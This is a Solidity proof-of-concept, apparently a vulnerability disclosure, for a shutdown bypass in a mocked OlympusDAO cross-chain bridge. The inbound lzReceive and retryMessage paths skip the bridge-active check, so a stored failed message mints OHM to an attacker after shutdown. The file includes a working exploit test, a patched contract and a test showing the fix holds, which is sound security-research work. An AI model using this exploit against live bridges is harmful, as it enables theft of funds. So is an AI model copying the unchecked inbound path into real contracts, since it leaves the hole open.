// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

/**
 * @title PoC #2 : OlympusDAO CrossChainBridge — Shutdown Bypass (Toxic Contagion)
 * @author Manus AI
 * 
 * VULNERABILITY:
 *   The flag bridgeActive is checked ONLY in sendOhm (outbound).
 *   The functions lzReceive and retryMessage (inbound) ignore this flag.
 *
 * ATTACK VECTOR:
 *   1. Attacker stores a malicious message in failedMessages.
 *   2. Governance deactivates the bridge (bridgeActive = false).
 *   3. Attacker calls retryMessage -> OHM minted despite the shutdown.
 */

// --- Mock OHM ---
contract MockOHM {
    string public name = "Olympus";
    string public symbol = "OHM";
    uint8 public decimals = 9;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

// --- Mock MINTR ---
contract MockMINTR {
    MockOHM public ohm;
    bool public globalActive = true;
    uint256 public totalMinted;
    mapping(address => uint256) public mintApproval;

    constructor(address ohm_) {
        ohm = MockOHM(ohm_);
    }

    function setGlobalActive(bool active_) external {
        globalActive = active_;
    }

    function increaseMintApproval(address policy_, uint256 amount_) external {
        mintApproval[policy_] += amount_;
    }

    function mintOhm(address to_, uint256 amount_) external {
        require(globalActive, "MINTR_NotActive");
        ohm.mint(to_, amount_);
        totalMinted += amount_;
    }

    function burnOhm(address from_, uint256 amount_) external {
        ohm.burn(from_, amount_);
    }
}

// --- Vulnerable CrossChainBridge ---
contract CrossChainBridgePOC {
    MockMINTR public MINTR;
    MockOHM public ohm;
    bool public bridgeActive;
    address public admin;

    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;
    mapping(uint16 => bytes) public trustedRemoteLookup;

    constructor(address mintr_) {
        MINTR = MockMINTR(mintr_);
        ohm = MINTR.ohm();
        bridgeActive = true;
        admin = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    function setBridgeStatus(bool isActive_) external onlyAdmin {
        bridgeActive = isActive_;
    }

    function setTrustedRemote(uint16 srcChainId_, bytes calldata path_) external onlyAdmin {
        trustedRemoteLookup[srcChainId_] = path_;
    }

    function _receiveMessage(uint16 srcChainId_, bytes memory, uint64, bytes memory payload_) internal virtual {
        // ✗ VULNERABILITY: NO bridgeActive check
        (address to, uint256 amount) = abi.decode(payload_, (address, uint256));
        MINTR.increaseMintApproval(address(this), amount);
        MINTR.mintOhm(to, amount);
    }

    function lzReceive(uint16 srcChainId_, bytes calldata srcAddress_, uint64 nonce_, bytes calldata payload_) public virtual {
        // Trusted remote check
        bytes memory trustedRemote = trustedRemoteLookup[srcChainId_];
        require(keccak256(srcAddress_) == keccak256(trustedRemote), "InvalidSource");

        // ✗ VULNERABILITY: NO bridgeActive check
        (bool success, ) = address(this).call(
            abi.encodeWithSignature("receiveMessage(uint16,bytes,uint64,bytes)", srcChainId_, srcAddress_, nonce_, payload_)
        );

        if (!success) {
            failedMessages[srcChainId_][srcAddress_][nonce_] = keccak256(payload_);
        }
    }

    function receiveMessage(uint16 srcChainId_, bytes memory srcAddress_, uint64 nonce_, bytes memory payload_) public {
        require(msg.sender == address(this), "InvalidCaller");
        _receiveMessage(srcChainId_, srcAddress_, nonce_, payload_);
    }

    function retryMessage(uint16 srcChainId_, bytes calldata srcAddress_, uint64 nonce_, bytes calldata payload_) public virtual {
        bytes32 payloadHash = failedMessages[srcChainId_][srcAddress_][nonce_];
        require(payloadHash != bytes32(0), "NoStoredMessage");
        require(keccak256(payload_) == payloadHash, "InvalidPayload");

        failedMessages[srcChainId_][srcAddress_][nonce_] = bytes32(0);

        // ✗ VULNERABILITY: NO bridgeActive check
        _receiveMessage(srcChainId_, srcAddress_, nonce_, payload_);
    }
}

// --- Fixed CrossChainBridge ---
contract CrossChainBridgePOC_FIXED is CrossChainBridgePOC {
    constructor(address mintr_) CrossChainBridgePOC(mintr_) {}

    function _receiveMessage(uint16 srcChainId_, bytes memory srcAddress_, uint64 nonce_, bytes memory payload_) internal override {
        // ✓ FIX: Atomic check for all inbound pathways
        require(bridgeActive, "Bridge_Deactivated");

        (address to, uint256 amount) = abi.decode(payload_, (address, uint256));
        MINTR.increaseMintApproval(address(this), amount);
        MINTR.mintOhm(to, amount);
    }
}

// --- Exploit Test ---
contract BridgeExploitTest {
    MockOHM ohm;
    MockMINTR mintr;
    CrossChainBridgePOC bridge;
    CrossChainBridgePOC_FIXED bridgeFixed;
    
    address attacker = address(0xBAD);
    uint16 srcChainId = 137;
    bytes srcAddress = abi.encodePacked(address(0x123));
    uint64 nonce = 42;

    constructor() {
        ohm = new MockOHM();
        mintr = new MockMINTR(address(ohm));
        bridge = new CrossChainBridgePOC(address(mintr));
        bridgeFixed = new CrossChainBridgePOC_FIXED(address(mintr));
        
        bridge.setTrustedRemote(srcChainId, srcAddress);
        bridgeFixed.setTrustedRemote(srcChainId, srcAddress);
    }

    function testExploit() public returns (bool success) {
        bytes memory payload = abi.encode(attacker, 1_000_000 * 1e9);

        // 1. Store message (simulate failure)
        mintr.setGlobalActive(false);
        bridge.lzReceive(srcChainId, srcAddress, nonce, payload);
        mintr.setGlobalActive(true);

        // 2. Shutdown bridge
        bridge.setBridgeStatus(false);

        // 3. Bypass shutdown
        bridge.retryMessage(srcChainId, srcAddress, nonce, payload);
        
        success = ohm.balanceOf(attacker) == 1_000_000 * 1e9;
        require(success, "Exploit failed");
    }

    function testFix() public {
        bytes memory payload = abi.encode(attacker, 1_000_000 * 1e9);

        // 1. Store message
        mintr.setGlobalActive(false);
        bridgeFixed.lzReceive(srcChainId, srcAddress, nonce, payload);
        mintr.setGlobalActive(true);

        // 2. Shutdown bridge
        bridgeFixed.setBridgeStatus(false);

        // 3. Attempt bypass (should revert)
        try bridgeFixed.retryMessage(srcChainId, srcAddress, nonce, payload) {
            revert("Fix failed: retryMessage should have reverted");
        } catch Error(string memory reason) {
            require(keccak256(bytes(reason)) == keccak256(bytes("Bridge_Deactivated")), "Wrong revert reason");
        }
    }
}
